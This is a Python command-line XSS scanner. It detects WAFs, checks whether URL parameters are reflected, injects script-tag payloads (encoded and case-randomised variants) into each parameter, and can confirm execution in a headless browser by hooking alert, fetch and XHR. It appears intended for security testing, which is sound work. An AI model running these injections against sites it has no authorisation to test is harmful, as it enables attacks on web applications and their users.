#!/usr/bin/env python3
import argparse
import requests
import random
import time
import threading
import os
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, parse_qsl

init(autoreset=True)

# Try optional Selenium imports. If missing we'll fallback to HTTP-only mode.
SELENIUM_AVAILABLE = False
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import NoAlertPresentException, WebDriverException
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except Exception:
    SELENIUM_AVAILABLE = False

# ------------ User Prompt ------------
def prompt_user(question, default_yes=True, timeout=5):
    reply = [None]

    def get_input():
        try:
            user_input = input(f"{question} (Y/n) [default {'Yes' if default_yes else 'No'}]: ").strip().lower()
            if user_input in ["y", "yes"]:
                reply[0] = True
            elif user_input in ["n", "no"]:
                reply[0] = False
            else:
                reply[0] = default_yes
        except EOFError:
            reply[0] = default_yes

    th = threading.Thread(target=get_input)
    th.daemon = True
    th.start()

    start_time = time.time()
    while time.time() - start_time < timeout:
        if reply[0] is not None:
            return reply[0]
        time.sleep(0.1)

    print(f"\n[*] No input detected after {timeout}s. Using default: {'Yes' if default_yes else 'No'}.\n")
    return default_yes

# ------------ WAF DETECTION ------------
def detect_waf(url):
    waf_signatures = {
        "cloudflare": ["cf-ray", "cloudflare"],
        "sucuri": ["sucuri-firewall"],
        "akamai": ["akamai", "akamai-ghost"],
        "imperva": ["incapsula"],
        "barracuda": ["barra"],
        "f5 BigIP": ["x-waf"],
        "fortinet": ["fortiwaf"],
    }
    try:
        response = requests.get(url, timeout=6)
        headers = str(response.headers).lower()
        for waf, keys in waf_signatures.items():
            if any(k in headers for k in keys):
                return waf
        return "No WAF detected"
    except Exception as e:
        return f"Error detecting WAF: {e}"

# ------------ PAYLOADS ------------
def generate_payloads():
    base = "<script>alert(1)</script>"
    html_encoded = "&lt;script&gt;alert(1)&lt;/script&gt;"
    unicode_encoded = "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
    random_case = "".join(random.choice([c.lower(), c.upper()]) for c in base)
    return [base, html_encoded, unicode_encoded, random_case]

# ------------ Selenium helpers ------------
def setup_selenium(headless=True):
    """Return (driver, error_str) where driver is None on failure."""
    if not SELENIUM_AVAILABLE:
        return None, "selenium-not-installed"

    opts = Options()
    if headless:
        try:
            opts.add_argument("--headless=new")
        except Exception:
            opts.add_argument("--headless")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_experimental_option("excludeSwitches", ["enable-logging"])

    # try common browser paths or CHROME_BINARY env var
    browser_candidates = [
        os.environ.get("CHROME_BINARY"),
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/snap/bin/chromium",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
    ]
    for p in browser_candidates:
        if p and os.path.exists(p):
            try:
                opts.binary_location = p
            except Exception:
                pass
            break

    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=opts)
        driver.set_page_load_timeout(20)
        return driver, None
    except Exception as e:
        return None, str(e)
def _check_alert(driver):
    """
    Check for native dialogs (alert/confirm/prompt). Returns (True, text) if found.
    """
    try:
        alert = driver.switch_to.alert
        text = alert.text
        # accept so page continues
        try:
            alert.accept()
        except Exception:
            try:
                alert.dismiss()
            except Exception:
                pass
        return True, text
    except Exception:
        return False, None

# ---- practical verify_with_selenium (most-common instrumentation) ----
def verify_with_selenium(driver, url, wait=4):
    """
    Practical verification covering most common signals:
      - native dialogs (alert/confirm/prompt)
      - overrides for alert/confirm/prompt that log into window.__xss_hits
      - lightweight XHR/fetch wrapping
      - DOM mutation observer (counts mutations)
      - simple interaction spray (click/focus/mouse events)
    Returns (ok, detail) where detail is a short string describing the hit or reason.
    """
    logs = []
    if driver is None:
        return False, "no-driver"
    # load the page
    try:
        driver.get(url)
    except Exception as e:
        return False, f"page-load-error:{e}"

    # quick native-dialog check (short)
    end = time.time() + wait
    while time.time() < end:
        ok, txt = _check_alert(driver)
        if ok:
            return True, f"native-dialog:{txt}"
        time.sleep(0.25)

    # instrumentation script (practical common set)
    instr = r"""
    (function(){
      try{
        if(window.__xss_instrumentation_installed) return "already";
        window.__xss_instrumentation_installed = true;
        window.__xss_hits = window.__xss_hits || [];

        function hit(type, payload){
          try{
            window.__xss_hits.push({type: type, payload: payload || null, t: Date.now()});
            if(window.__xss_hits.length>50) window.__xss_hits.shift();
          }catch(e){}
        }

        // override alert/confirm/prompt
        try{
          var _alert = window.alert;
          window.alert = function(msg){
            hit("alert", String(msg));
            try{ return _alert.apply(this, arguments); }catch(e){}
          };
        }catch(e){}
        try{
          var _confirm = window.confirm;
          window.confirm = function(msg){
            hit("confirm", String(msg));
            try{ return _confirm.apply(this, arguments); }catch(e){ return true; }
          };
        }catch(e){}
        try{
          var _prompt = window.prompt;
          window.prompt = function(msg, def){
            hit("prompt", String(msg));
            try{ return _prompt.apply(this, arguments); }catch(e){ return def || ""; }
          };
        }catch(e){}

        // wrap XHR
        try{
          (function(){
            var _open = XMLHttpRequest.prototype.open;
            var _send = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.open = function(meth, url){
              this.__xss_method = meth;
              this.__xss_url = url;
              return _open.apply(this, arguments);
            };
            XMLHttpRequest.prototype.send = function(body){
              try{ hit("xhr", (this.__xss_method||"") + " " + (this.__xss_url||"") + " body:" + (body?String(body):"")); }catch(e){}
              return _send.apply(this, arguments);
            };
          })();
        }catch(e){}

        // wrap fetch
        try{
          if(window.fetch){
            var _fetch = window.fetch;
            window.fetch = function(input, init){
              try{
                var url = (typeof input === "string") ? input : (input && input.url) || "";
                hit("fetch", url + (init? " opts" : ""));
              }catch(e){}
              return _fetch.apply(this, arguments);
            };
          }
        }catch(e){}

        // DOM mutation observer
        try{
          var mObs = new MutationObserver(function(m){
            try{ hit("dom-mutation", "count:"+m.length); }catch(e){}
          });
          mObs.observe(document.documentElement || document, {subtree:true, childList:true, attributes:true, characterData:true});
        }catch(e){}

        return "ok";
      }catch(err){
        return "error:"+String(err);
      }
    })();
    """

    try:
        res = driver.execute_script(instr)
        # keep logs local; not returned to caller to preserve existing output behavior
        logs.append(f"instrumentation:{res}")
    except Exception as e:
        logs.append(f"instrumentation-error:{e}")

    # helper to poll hits
    def poll_hits(timeout_s):
        poll_end = time.time() + timeout_s
        while time.time() < poll_end:
            try:
                hits = driver.execute_script("return (window.__xss_hits && window.__xss_hits.slice()) || []")
            except Exception:
                hits = []
            if hits and len(hits) > 0:
                try:
                    h = hits[0]
                    typ = h.get("type") if isinstance(h, dict) else "hit"
                    payload = h.get("payload") if isinstance(h, dict) else None
                    return True, f"{typ}:{payload}"
                except Exception:
                    return True, "instrumentation-hit"
            time.sleep(0.3)
        return False, None

    # short poll before interactions
    ok, detail = poll_hits(wait)
    if ok:
        return True, detail

    # interaction spray (practical subset)
    try:
        driver.execute_script("""
            (function(){
                var els = Array.prototype.slice.call(document.querySelectorAll('a,button,input,textarea,select,[onclick],[onmouseover],[onmousedown]'));
                var count = 0;
                for(var i=0;i<els.length && count<20;i++){
                    try{
                        var e = els[i];
                        var r = e.getBoundingClientRect ? e.getBoundingClientRect() : {width:0,height:0};
                        if(r.width<=0 && r.height<=0) continue;
                        try{ e.focus && e.focus(); }catch(ex){}
                        try{ e.click && e.click(); }catch(ex){}
                        var ev = new MouseEvent('mouseover', {bubbles:true, cancelable:true, view:window});
                        try{ e.dispatchEvent(ev); }catch(ex){}
                        count++;
                    }catch(e){}
                }
                return count;
            })();
        """)
    except Exception:
        pass

    # poll after interactions (allow a bit more time)
    ok, detail = poll_hits(wait * 2)
    if ok:
        return True, detail

    # final native-dialog check after interactions
    end = time.time() + wait
    while time.time() < end:
        ok, txt = _check_alert(driver)
        if ok:
            return True, f"native-dialog-after:{txt}"
        time.sleep(0.25)

    # nothing detected
    return False, "no-detection"

# ------------ REFLECTION CHECK ------------
def check_reflection(url, param, marker="xsstest123"):
    parsed = urlparse(url)
    query_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query_params[param] = marker
    new_query = urlencode(query_params)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    try:
        resp = requests.get(new_url, timeout=6)
        if marker in resp.text:
            print(Fore.GREEN + f"[+] Parameter '{param}' is reflected!" + Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + f"[-] Parameter '{param}' not reflected." + Style.RESET_ALL)
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error during reflection check: {e}" + Style.RESET_ALL)
        return False

# ------------ XSS SCAN FUNCTION ------------
def scan_url(url, payloads, skip_not_reflected, selenium_driver=None, selenium_verify=False, selenium_wait=4):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    print(Fore.CYAN + f"\n[*] Analyzing {url}" + Style.RESET_ALL)

    waf = detect_waf(url)
    print(Fore.MAGENTA + f"[WAF DETECTED] {waf}" + Style.RESET_ALL)

    for param in list(params.keys()):
        reflected = check_reflection(url, param)
        if not reflected:
            if skip_not_reflected:
                print(Fore.LIGHTBLACK_EX + f"[*] Skipping parameter '{param}' (flag --skip-not-reflected-parameter enabled)" + Style.RESET_ALL)
                continue
            else:
                should_test = prompt_user(f"Parameter '{param}' not reflected. Test anyway?", default_yes=True, timeout=5)
                if not should_test:
                    print(Fore.LIGHTBLACK_EX + f"[*] Skipping parameter '{param}' (user chose No)" + Style.RESET_ALL)
                    continue

        # reconstruct safe test URL (handles blank values and duplicate params)
        original_vals = params.get(param, [""] )
        original_value = original_vals[0] if original_vals else ""
        for payload in payloads:
            p = urlparse(url)
            qsl = parse_qsl(p.query, keep_blank_values=True)
            new_qsl = []
            replaced = False
            for k, v in qsl:
                if k == param and not replaced:
                    new_qsl.append((k, payload))
                    replaced = True
                else:
                    new_qsl.append((k, v))
            if not replaced:
                new_qsl.append((param, payload))
            test_query = urlencode(new_qsl, doseq=True)
            test_url = urlunparse((p.scheme, p.netloc, p.path, p.params, test_query, p.fragment))

            # HTTP fast-check
            try:
                resp = requests.get(test_url, timeout=7)
                candidate = payload in (resp.text or "")
            except Exception as e:
                print(Fore.RED + f"[!] Error testing {param}: {e}" + Style.RESET_ALL)
                candidate = False

            # If Selenium verification requested and candidate found by HTTP,
            # verify in browser to avoid false positives.
            if selenium_verify and selenium_driver:
                if candidate:
                    ok, info = verify_with_selenium(selenium_driver, test_url, wait=selenium_wait)
                    if ok:
                        print(Fore.GREEN + f"[XSS FOUND] Parameter '{param}' vulnerable with payload: {payload}" + Style.RESET_ALL)
                        if info and info != "no-alert-detected":
                            print(Fore.YELLOW + f"[DETAIL] {info}" + Style.RESET_ALL)
                    else:
                        # Not confirmed in browser -> false positive; show tested snippet instead (no XSS FOUND)
                        print(Fore.LIGHTBLACK_EX + f"[-] Tested {param} with payload snippet: {payload[:20]}..." + Style.RESET_ALL)
                else:
                    # if HTTP didn't reflect, still show tested line to keep outputs consistent
                    print(Fore.LIGHTBLACK_EX + f"[-] Tested {param} with payload snippet: {payload[:20]}..." + Style.RESET_ALL)
            else:
                # legacy behavior: report candidate from HTTP-only checks
                if candidate:
                    print(Fore.GREEN + f"[XSS FOUND - CANDIDATE] Parameter '{param}' possibly vulnerable with payload: {payload}" + Style.RESET_ALL)
                else:
                    print(Fore.LIGHTBLACK_EX + f"[-] Tested {param} with payload snippet: {payload[:20]}..." + Style.RESET_ALL)

# ------------ MAIN ------------
def main():
    parser = argparse.ArgumentParser(description="Smart XSS Scanner with Reflection Pre-Check and optional Selenium verification (zero false positives)")
    parser.add_argument("-u", help="Single URL with parameters for scanning (e.g. https://site.com/?q=xss)")
    parser.add_argument("-m", help="File containing multiple URLs (one URL per line)")
    parser.add_argument("-p", "--payloads", help="Custom payloads file")
    parser.add_argument("--skip-not-reflected-parameter", action="store_true",
                        help="Automatically skip parameters not reflected without prompting")
    parser.add_argument("--selenium", action="store_true", help="Enable Selenium browser verification to confirm real JS alerts (reduces false positives)")
    parser.add_argument("--headless", action="store_true", help="Run Selenium in headless mode (only used if --selenium is enabled)")
    parser.add_argument("--selenium-wait", type=int, default=4, help="Seconds to wait for alert when verifying with Selenium")

    args = parser.parse_args()

    urls = []
    if args.u:
        urls.append(args.u)
    elif args.m:
        try:
            with open(args.m, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(Fore.RED + f"[!] Could not load URLs file: {e}" + Style.RESET_ALL)
            return
    else:
        print(Fore.RED + "[!] Provide a target URL with -u or multiple URLs with -m" + Style.RESET_ALL)
        return

    payloads = []
    if args.payloads:
        try:
            with open(args.payloads, "r", errors="ignore") as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(payloads)} custom payloads from file." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Could not load payloads file: {e}" + Style.RESET_ALL)
            return
    else:
        payloads = generate_payloads()

    selenium_driver = None
    if args.selenium:
        driver, err = setup_selenium(headless=args.headless)
        if driver is None:
            print(Fore.RED + f"[!] Selenium initialization failed: {err}" + Style.RESET_ALL)
            print(Fore.RED + "[!] Running in HTTP-only mode (no Selenium verification)." + Style.RESET_ALL)
        else:
            selenium_driver = driver

    try:
        for url in urls:
            scan_url(url, payloads, args.skip_not_reflected_parameter, selenium_driver=selenium_driver, selenium_verify=bool(selenium_driver), selenium_wait=args.selenium_wait)
    finally:
        if selenium_driver:
            try:
                selenium_driver.quit()
            except Exception:
                pass

if __name__ == "__main__":
    main()
